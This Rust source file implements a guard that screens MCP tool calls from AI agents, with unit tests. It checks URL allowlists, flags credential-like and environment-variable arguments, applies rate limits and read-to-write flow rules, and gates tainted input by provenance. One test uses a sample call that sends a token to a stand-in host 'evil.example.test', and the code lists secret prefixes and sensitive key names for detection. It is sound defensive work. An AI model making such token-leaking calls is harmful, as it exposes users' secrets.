use std::collections::{BTreeMap, VecDeque};

use agentenv_policy::provenance::{
    default_tool_declaration, evaluate_capability_policy, join_tags, CapabilityPolicyDecision,
};
use agentenv_proto::{
    McpApprovalMode, McpGuardConfig, McpSessionRateLimit, ProvenanceSummary, ProvenanceTag,
};
use serde_json::{json, Value};
use thiserror::Error;
use url::Url;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MatchedToolPolicy {
    pub pattern: Option<String>,
    pub approval: McpApprovalMode,
    pub rate_limit: Option<McpSessionRateLimit>,
    pub url_allowlist: Vec<String>,
    pub redact_args: bool,
}

#[derive(Debug, Default)]
pub struct GuardSessionState {
    calls_by_pattern: BTreeMap<String, u32>,
    recent_reads: VecDeque<RecentRead>,
    session_grants: BTreeMap<String, bool>,
    tool_calls_seen: u64,
}

impl GuardSessionState {
    pub fn grant_session(&mut self, tool_name: impl Into<String>) {
        self.session_grants.insert(tool_name.into(), true);
    }

    fn has_session_grant(&self, tool_name: &str, matched_policy: Option<&str>) -> bool {
        self.session_grants.get(tool_name).copied().unwrap_or(false)
            || matched_policy
                .and_then(|pattern| self.session_grants.get(pattern))
                .copied()
                .unwrap_or(false)
    }
}

#[derive(Debug)]
struct RecentRead {
    turn: u64,
}

#[derive(Debug, Clone, PartialEq)]
pub struct GuardDecision {
    pub action: GuardAction,
    pub reason: GuardReason,
    pub tool_name: Option<String>,
    pub matched_policy: Option<String>,
    pub approval_mode: McpApprovalMode,
    pub redacted_event_context: Value,
}

#[derive(Debug, Clone, PartialEq)]
pub struct GuardEvaluation {
    pub decision: GuardDecision,
    pub forwarded_request: Value,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GuardAction {
    Forward,
    Deny,
    RequestApproval,
    NotToolCall,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GuardReason {
    Disabled,
    NotToolCall,
    AllowedByPolicy,
    ApprovalRequired,
    UrlAllowlistViolation,
    CredentialLikeArgument,
    EnvVarLikeArgument,
    RateLimited,
    CrossToolFlow,
    MalformedToolCall,
    ProvenanceTaint,
}

#[derive(Debug, Error)]
pub enum GuardError {
    #[error("malformed MCP tool call: {0}")]
    MalformedToolCall(String),
}

pub fn match_policy(config: &McpGuardConfig, tool_name: &str) -> MatchedToolPolicy {
    if let Some(policy) = config.tool_policies.get(tool_name) {
        return MatchedToolPolicy {
            pattern: Some(tool_name.to_owned()),
            approval: policy
                .approval
                .clone()
                .unwrap_or_else(|| config.default_approval.clone()),
            rate_limit: policy.rate_limit,
            url_allowlist: policy.url_allowlist.clone(),
            redact_args: policy.redact_args,
        };
    }

    let wildcard = config
        .tool_policies
        .iter()
        .filter(|(pattern, _)| pattern.contains('*') && wildcard_matches(pattern, tool_name))
        .max_by(|(left, _), (right, _)| {
            wildcard_specificity(left).cmp(&wildcard_specificity(right))
        });

    if let Some((pattern, policy)) = wildcard {
        return MatchedToolPolicy {
            pattern: Some(pattern.clone()),
            approval: policy
                .approval
                .clone()
                .unwrap_or_else(|| config.default_approval.clone()),
            rate_limit: policy.rate_limit,
            url_allowlist: policy.url_allowlist.clone(),
            redact_args: policy.redact_args,
        };
    }

    MatchedToolPolicy {
        pattern: None,
        approval: config.default_approval.clone(),
        rate_limit: None,
        url_allowlist: Vec::new(),
        redact_args: false,
    }
}

pub fn evaluate_json_rpc_request(
    config: &McpGuardConfig,
    state: &mut GuardSessionState,
    request: &Value,
) -> Result<GuardDecision, GuardError> {
    evaluate_json_rpc_request_with_forwarding(config, state, request)
        .map(|evaluation| evaluation.decision)
}

pub fn evaluate_json_rpc_request_with_forwarding(
    config: &McpGuardConfig,
    state: &mut GuardSessionState,
    request: &Value,
) -> Result<GuardEvaluation, GuardError> {
    let base_decision = evaluate_json_rpc_request_without_provenance(config, state, request)?;
    let forwarded_request = strip_agentenv_provenance(request);

    if !matches!(
        base_decision.action,
        GuardAction::Forward | GuardAction::RequestApproval
    ) {
        return Ok(GuardEvaluation {
            decision: base_decision,
            forwarded_request,
        });
    }

    let Some(provenance_config) = config.provenance.as_ref().filter(|cfg| cfg.enabled) else {
        return Ok(GuardEvaluation {
            decision: base_decision,
            forwarded_request,
        });
    };

    let Some(tool_name) = base_decision.tool_name.as_deref() else {
        return Ok(GuardEvaluation {
            decision: base_decision,
            forwarded_request,
        });
    };

    let declaration = config
        .tool_capabilities
        .get(tool_name)
        .cloned()
        .unwrap_or_else(|| default_tool_declaration(tool_name));
    let provenance = provenance_from_request(request, provenance_config.default_unannotated_source);
    let observed_taint = join_tags(provenance.iter().map(|summary| summary.tag));
    let policy_decision = evaluate_capability_policy(&declaration, observed_taint);

    let provenance_context = json!({
        "observed_taint": observed_taint,
        "max_input_taint": declaration.max_input_taint,
        "caps": declaration.caps,
        "sources": provenance,
    });

    let mut decision = base_decision;
    decision.redacted_event_context =
        merge_event_context_with_provenance(decision.redacted_event_context, provenance_context);

    match policy_decision {
        CapabilityPolicyDecision::Allow => {}
        CapabilityPolicyDecision::RequestApproval => {
            decision.action = GuardAction::RequestApproval;
            decision.reason = GuardReason::ProvenanceTaint;
            decision.approval_mode = declaration.approval;
        }
        CapabilityPolicyDecision::Deny => {
            decision.action = GuardAction::Deny;
            decision.reason = GuardReason::ProvenanceTaint;
        }
    }

    Ok(GuardEvaluation {
        decision,
        forwarded_request,
    })
}

fn evaluate_json_rpc_request_without_provenance(
    config: &McpGuardConfig,
    state: &mut GuardSessionState,
    request: &Value,
) -> Result<GuardDecision, GuardError> {
    let Some(method) = request.get("method").and_then(Value::as_str) else {
        return Ok(not_tool_call_decision(
            config.default_approval.clone(),
            None,
        ));
    };

    if method != "tools/call" {
        return Ok(not_tool_call_decision(
            config.default_approval.clone(),
            Some(method),
        ));
    }

    if !config.enabled {
        return Ok(GuardDecision {
            action: GuardAction::Forward,
            reason: GuardReason::Disabled,
            tool_name: tool_name_from_request(request).ok(),
            matched_policy: None,
            approval_mode: config.default_approval.clone(),
            redacted_event_context: json!({"method": method, "guard": "disabled"}),
        });
    }

    let params = request
        .get("params")
        .and_then(Value::as_object)
        .ok_or_else(|| GuardError::MalformedToolCall("missing params object".to_owned()))?;
    let tool_name = params
        .get("name")
        .and_then(Value::as_str)
        .ok_or_else(|| GuardError::MalformedToolCall("missing params.name".to_owned()))?;
    let arguments = params.get("arguments").unwrap_or(&Value::Null);
    let matched = match_policy(config, tool_name);
    let event_context = event_context(tool_name, arguments, &matched);

    if !matched.url_allowlist.is_empty()
        && has_url_allowlist_violation(arguments, &matched.url_allowlist)
    {
        return Ok(decision(
            GuardAction::Deny,
            GuardReason::UrlAllowlistViolation,
            tool_name,
            &matched,
            event_context,
        ));
    }

    if contains_credential_like_argument(arguments) {
        return Ok(decision(
            GuardAction::Deny,
            GuardReason::CredentialLikeArgument,
            tool_name,
            &matched,
            event_context,
        ));
    }

    if contains_env_var_like_argument(arguments) {
        return Ok(decision(
            GuardAction::Deny,
            GuardReason::EnvVarLikeArgument,
            tool_name,
            &matched,
            event_context,
        ));
    }

    if exceeds_rate_limit(state, tool_name, &matched) {
        return Ok(decision(
            GuardAction::Deny,
            GuardReason::RateLimited,
            tool_name,
            &matched,
            event_context,
        ));
    }

    if violates_cross_tool_flow(config, state, tool_name) {
        return Ok(decision(
            GuardAction::RequestApproval,
            GuardReason::CrossToolFlow,
            tool_name,
            &matched,
            event_context,
        ));
    }

    let (action, reason) = match matched.approval {
        McpApprovalMode::Never => (GuardAction::Forward, GuardReason::AllowedByPolicy),
        McpApprovalMode::PerCall => (GuardAction::RequestApproval, GuardReason::ApprovalRequired),
        McpApprovalMode::PerSession
            if state.has_session_grant(tool_name, matched.pattern.as_deref()) =>
        {
            (GuardAction::Forward, GuardReason::AllowedByPolicy)
        }
        McpApprovalMode::PerSession => {
            (GuardAction::RequestApproval, GuardReason::ApprovalRequired)
        }
    };

    Ok(decision(action, reason, tool_name, &matched, event_context))
}

fn provenance_from_request(request: &Value, default_tag: ProvenanceTag) -> Vec<ProvenanceSummary> {
    request
        .get("params")
        .and_then(Value::as_object)
        .and_then(|params| params.get("_agentenv_provenance"))
        .and_then(Value::as_object)
        .map(|entries| {
            entries
                .values()
                .filter_map(|value| serde_json::from_value::<ProvenanceSummary>(value.clone()).ok())
                .collect::<Vec<_>>()
        })
        .filter(|items| !items.is_empty())
        .unwrap_or_else(|| {
            vec![ProvenanceSummary {
                tag: default_tag,
                source_kind: agentenv_proto::ProvenanceSourceKind::Unknown,
                source_id: "unannotated".to_owned(),
                summary: Some("unannotated MCP tool argument".to_owned()),
            }]
        })
}

fn strip_agentenv_provenance(request: &Value) -> Value {
    let mut stripped = request.clone();
    if let Some(params) = stripped.get_mut("params").and_then(Value::as_object_mut) {
        params.remove("_agentenv_provenance");
    }
    stripped
}

fn merge_event_context_with_provenance(mut event_context: Value, provenance: Value) -> Value {
    if let Some(map) = event_context.as_object_mut() {
        map.insert("provenance".to_owned(), provenance);
        event_context
    } else {
        json!({ "provenance": provenance })
    }
}

fn not_tool_call_decision(approval_mode: McpApprovalMode, method: Option<&str>) -> GuardDecision {
    GuardDecision {
        action: GuardAction::NotToolCall,
        reason: GuardReason::NotToolCall,
        tool_name: None,
        matched_policy: None,
        approval_mode,
        redacted_event_context: json!({"method": method}),
    }
}

fn decision(
    action: GuardAction,
    reason: GuardReason,
    tool_name: &str,
    matched: &MatchedToolPolicy,
    redacted_event_context: Value,
) -> GuardDecision {
    GuardDecision {
        action,
        reason,
        tool_name: Some(tool_name.to_owned()),
        matched_policy: matched.pattern.clone(),
        approval_mode: matched.approval.clone(),
        redacted_event_context,
    }
}

fn event_context(tool_name: &str, arguments: &Value, matched: &MatchedToolPolicy) -> Value {
    json!({
        "tool_name": tool_name,
        "matched_policy": matched.pattern,
        "approval": matched.approval,
        "arguments": redact_arguments(arguments, matched.redact_args),
    })
}

fn tool_name_from_request(request: &Value) -> Result<String, GuardError> {
    request
        .get("params")
        .and_then(Value::as_object)
        .and_then(|params| params.get("name"))
        .and_then(Value::as_str)
        .map(str::to_owned)
        .ok_or_else(|| GuardError::MalformedToolCall("missing params.name".to_owned()))
}

fn wildcard_matches(pattern: &str, tool_name: &str) -> bool {
    let Some((prefix, suffix)) = pattern.split_once('*') else {
        return false;
    };
    tool_name.starts_with(prefix) && tool_name.ends_with(suffix)
}

fn wildcard_specificity(pattern: &str) -> usize {
    pattern.chars().filter(|ch| *ch != '*').count()
}

fn has_url_allowlist_violation(value: &Value, allowlist: &[String]) -> bool {
    urls_in_value(value)
        .into_iter()
        .any(|url| !url_host_allowed(&url, allowlist))
}

fn urls_in_value(value: &Value) -> Vec<Url> {
    let mut urls = Vec::new();
    collect_urls(value, &mut urls);
    urls
}

fn collect_urls(value: &Value, urls: &mut Vec<Url>) {
    match value {
        Value::String(text) => {
            if let Ok(url) = Url::parse(text) {
                if matches!(url.scheme(), "http" | "https") {
                    urls.push(url);
                }
            }
        }
        Value::Array(items) => {
            for item in items {
                collect_urls(item, urls);
            }
        }
        Value::Object(map) => {
            for item in map.values() {
                collect_urls(item, urls);
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
}

fn url_host_allowed(url: &Url, allowlist: &[String]) -> bool {
    let Some(host) = url.host_str() else {
        return false;
    };
    allowlist
        .iter()
        .any(|allowed| host == allowed || host.ends_with(&format!(".{allowed}")))
}

fn contains_credential_like_argument(value: &Value) -> bool {
    match value {
        Value::Object(map) => map
            .iter()
            .any(|(key, item)| is_sensitive_key(key) || contains_credential_like_argument(item)),
        Value::Array(items) => items.iter().any(contains_credential_like_argument),
        Value::String(text) => looks_like_secret_value(text),
        Value::Null | Value::Bool(_) | Value::Number(_) => false,
    }
}

fn contains_env_var_like_argument(value: &Value) -> bool {
    match value {
        Value::Object(map) => map.values().any(contains_env_var_like_argument),
        Value::Array(items) => items.iter().any(contains_env_var_like_argument),
        Value::String(text) => looks_like_env_var_reference(text),
        Value::Null | Value::Bool(_) | Value::Number(_) => false,
    }
}

fn exceeds_rate_limit(
    state: &mut GuardSessionState,
    tool_name: &str,
    matched: &MatchedToolPolicy,
) -> bool {
    let Some(limit) = matched.rate_limit else {
        return false;
    };
    let key = matched.pattern.as_deref().unwrap_or(tool_name).to_owned();
    let calls = state.calls_by_pattern.entry(key).or_insert(0);
    if *calls >= limit.calls {
        return true;
    }
    *calls = calls.saturating_add(1);
    false
}

fn violates_cross_tool_flow(
    config: &McpGuardConfig,
    state: &mut GuardSessionState,
    tool_name: &str,
) -> bool {
    let current_turn = state.tool_calls_seen;
    state.tool_calls_seen = state.tool_calls_seen.saturating_add(1);

    let Some(window) = config.cross_tool_flows.forbid_read_to_write_turns else {
        return false;
    };
    let window = window as u64;
    while state
        .recent_reads
        .front()
        .map(|read| current_turn.saturating_sub(read.turn) > window)
        .unwrap_or(false)
    {
        state.recent_reads.pop_front();
    }

    if (is_write_tool(tool_name) || is_external_tool(tool_name)) && !state.recent_reads.is_empty() {
        return true;
    }

    if is_read_tool(tool_name) {
        state
            .recent_reads
            .push_back(RecentRead { turn: current_turn });
    }

    false
}

fn redact_arguments(value: &Value, redact_all: bool) -> Value {
    if redact_all {
        return Value::String("[redacted]".to_owned());
    }

    match value {
        Value::Object(map) => Value::Object(
            map.iter()
                .map(|(key, item)| {
                    let value = if is_sensitive_key(key) {
                        Value::String("[redacted]".to_owned())
                    } else {
                        redact_arguments(item, false)
                    };
                    (key.clone(), value)
                })
                .collect(),
        ),
        Value::Array(items) => Value::Array(
            items
                .iter()
                .map(|item| redact_arguments(item, false))
                .collect(),
        ),
        Value::String(text) => redact_string(text),
        Value::Null | Value::Bool(_) | Value::Number(_) => value.clone(),
    }
}

fn redact_string(text: &str) -> Value {
    if looks_like_secret_value(text) || looks_like_env_var_reference(text) {
        return Value::String("[redacted]".to_owned());
    }

    if let Ok(mut url) = Url::parse(text) {
        if matches!(url.scheme(), "http" | "https") {
            url.set_query(None);
            url.set_fragment(None);
            if !url.username().is_empty() {
                let _ = url.set_username("[redacted]");
            }
            let _ = url.set_password(None);
            return Value::String(url.to_string());
        }
    }

    Value::String(text.to_owned())
}

fn is_sensitive_key(key: &str) -> bool {
    let key = key.to_ascii_lowercase();
    [
        "authorization",
        "credential",
        "password",
        "secret",
        "token",
        "api_key",
        "apikey",
    ]
    .iter()
    .any(|needle| key.contains(needle))
}

fn looks_like_secret_value(text: &str) -> bool {
    let trimmed = text.trim();
    trimmed.starts_with("Bearer ")
        || trimmed.starts_with("sk-")
        || trimmed.starts_with("ghp_")
        || trimmed.starts_with("gho_")
        || trimmed.starts_with("github_pat_")
}

fn looks_like_env_var_reference(text: &str) -> bool {
    let trimmed = text.trim();
    let name = trimmed
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
        .or_else(|| trimmed.strip_prefix('$'));
    name.map(is_env_var_name).unwrap_or(false)
}

fn is_env_var_name(value: &str) -> bool {
    let mut chars = value.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_uppercase())
        && chars.all(|ch| ch == '_' || ch.is_ascii_uppercase() || ch.is_ascii_digit())
}

fn is_read_tool(tool_name: &str) -> bool {
    let name = tool_name.to_ascii_lowercase();
    [
        "read", "fetch", "get", "list", "search", "query", "open", "download",
    ]
    .iter()
    .any(|needle| name.contains(needle))
}

fn is_write_tool(tool_name: &str) -> bool {
    let name = tool_name.to_ascii_lowercase();
    [
        "write", "create", "delete", "remove", "update", "patch", "apply", "commit", "send",
        "post", "put",
    ]
    .iter()
    .any(|needle| name.contains(needle))
}

fn is_external_tool(tool_name: &str) -> bool {
    let name = tool_name.to_ascii_lowercase();
    name.starts_with("web.")
        || name.starts_with("http.")
        || name.contains("fetch")
        || name.contains("browser")
        || name.contains("request")
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use agentenv_proto::{
        McpApprovalMode, McpCrossToolFlowPolicy, McpGuardConfig, McpSessionRateLimit, McpToolPolicy,
    };
    use serde_json::json;

    use super::*;

    #[test]
    fn exact_policy_beats_wildcard_policy() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::PerCall,
            tool_policies: [
                (
                    "*.write".to_owned(),
                    McpToolPolicy {
                        approval: Some(McpApprovalMode::PerSession),
                        ..McpToolPolicy::default()
                    },
                ),
                (
                    "filesystem.write".to_owned(),
                    McpToolPolicy {
                        approval: Some(McpApprovalMode::Never),
                        ..McpToolPolicy::default()
                    },
                ),
            ]
            .into_iter()
            .collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
            ..McpGuardConfig::default()
        };

        let matched = match_policy(&config, "filesystem.write");

        assert_eq!(matched.pattern.as_deref(), Some("filesystem.write"));
        assert_eq!(matched.approval, McpApprovalMode::Never);
    }

    #[test]
    fn evaluator_flags_url_allowlist_violation_in_nested_args() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::Never,
            tool_policies: [(
                "web.fetch".to_owned(),
                McpToolPolicy {
                    url_allowlist: vec!["api.github.com".to_owned()],
                    ..McpToolPolicy::default()
                },
            )]
            .into_iter()
            .collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
            ..McpGuardConfig::default()
        };
        let mut state = GuardSessionState::default();
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "web.fetch",
                "arguments": {"url": "https://evil.example.test/?token=secret"}
            }
        });

        let decision = evaluate_json_rpc_request(&config, &mut state, &request)
            .expect("request evaluation succeeds");

        assert_eq!(decision.action, GuardAction::Deny);
        assert_eq!(decision.reason, GuardReason::UrlAllowlistViolation);
        assert!(!decision
            .redacted_event_context
            .to_string()
            .contains("secret"));
    }

    #[test]
    fn session_rate_limit_denies_after_limit() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::Never,
            tool_policies: [(
                "filesystem.read".to_owned(),
                McpToolPolicy {
                    rate_limit: Some(McpSessionRateLimit { calls: 1 }),
                    ..McpToolPolicy::default()
                },
            )]
            .into_iter()
            .collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
            ..McpGuardConfig::default()
        };
        let mut state = GuardSessionState::default();
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "filesystem.read", "arguments": {"path": "/tmp/a"}}
        });

        assert_eq!(
            evaluate_json_rpc_request(&config, &mut state, &request)
                .unwrap()
                .action,
            GuardAction::Forward
        );
        let second = evaluate_json_rpc_request(&config, &mut state, &request).unwrap();
        assert_eq!(second.action, GuardAction::Deny);
        assert_eq!(second.reason, GuardReason::RateLimited);
    }

    #[test]
    fn read_then_write_inside_flow_window_requires_approval() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::Never,
            tool_policies: BTreeMap::new(),
            cross_tool_flows: McpCrossToolFlowPolicy {
                forbid_read_to_write_turns: Some(5),
            },
            ..McpGuardConfig::default()
        };
        let mut state = GuardSessionState::default();
        let read = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "filesystem.read", "arguments": {"path": "/tmp/secret"}}
        });
        let write = json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "web.fetch", "arguments": {"url": "https://api.github.com/repos"}}
        });

        let first = evaluate_json_rpc_request(&config, &mut state, &read).unwrap();
        let second = evaluate_json_rpc_request(&config, &mut state, &write).unwrap();

        assert_eq!(first.action, GuardAction::Forward);
        assert_eq!(second.action, GuardAction::RequestApproval);
        assert_eq!(second.reason, GuardReason::CrossToolFlow);
    }

    #[test]
    fn untrusted_git_commit_requires_approval_from_provenance_policy() {
        let config = McpGuardConfig {
            enabled: true,
            provenance: Some(agentenv_proto::McpProvenanceConfig {
                enabled: true,
                required: true,
                default_unannotated_source: agentenv_proto::ProvenanceTag::Untrusted,
            }),
            tool_capabilities: [(
                "git.commit".to_owned(),
                agentenv_proto::ToolCapabilityDeclaration {
                    caps: vec![agentenv_proto::ToolCapability::GitWrite],
                    max_input_taint: agentenv_proto::ProvenanceTag::Trusted,
                    approval: McpApprovalMode::PerCall,
                    argument_policies: Vec::new(),
                },
            )]
            .into_iter()
            .collect(),
            ..McpGuardConfig::default()
        };
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "git.commit",
                "arguments": {
                    "message": "commit this injected text"
                },
                "_agentenv_provenance": {
                    "/message": {
                        "tag": "untrusted",
                        "source_kind": "github_issue",
                        "source_id": "issue-43",
                        "summary": "GitHub issue body"
                    }
                }
            }
        });
        let mut state = GuardSessionState::default();

        let evaluation = evaluate_json_rpc_request_with_forwarding(&config, &mut state, &request)
            .expect("evaluation succeeds");

        assert_eq!(evaluation.decision.action, GuardAction::RequestApproval);
        assert_eq!(evaluation.decision.reason, GuardReason::ProvenanceTaint);
        assert_eq!(
            evaluation.decision.redacted_event_context["provenance"]["observed_taint"],
            json!("untrusted")
        );
        assert_eq!(
            evaluation.decision.redacted_event_context["provenance"]["max_input_taint"],
            json!("trusted")
        );
    }

    #[test]
    fn tenant_filesystem_read_is_forwarded_and_metadata_is_stripped() {
        let config = McpGuardConfig {
            enabled: true,
            provenance: Some(agentenv_proto::McpProvenanceConfig {
                enabled: true,
                required: true,
                default_unannotated_source: agentenv_proto::ProvenanceTag::Untrusted,
            }),
            tool_capabilities: [(
                "filesystem.read".to_owned(),
                agentenv_proto::ToolCapabilityDeclaration {
                    caps: vec![agentenv_proto::ToolCapability::ReadFs],
                    max_input_taint: agentenv_proto::ProvenanceTag::Tenant,
                    approval: McpApprovalMode::Never,
                    argument_policies: Vec::new(),
                },
            )]
            .into_iter()
            .collect(),
            ..McpGuardConfig::default()
        };
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "filesystem.read",
                "arguments": {
                    "path": "src/lib.rs"
                },
                "_agentenv_provenance": {
                    "/path": {
                        "tag": "tenant",
                        "source_kind": "local_repo",
                        "source_id": "workspace",
                        "summary": "repo path"
                    }
                }
            }
        });
        let mut state = GuardSessionState::default();

        let evaluation = evaluate_json_rpc_request_with_forwarding(&config, &mut state, &request)
            .expect("evaluation succeeds");

        assert_eq!(evaluation.decision.action, GuardAction::Forward);
        assert!(evaluation
            .forwarded_request
            .get("params")
            .and_then(serde_json::Value::as_object)
            .is_some_and(|params| !params.contains_key("_agentenv_provenance")));
    }
}
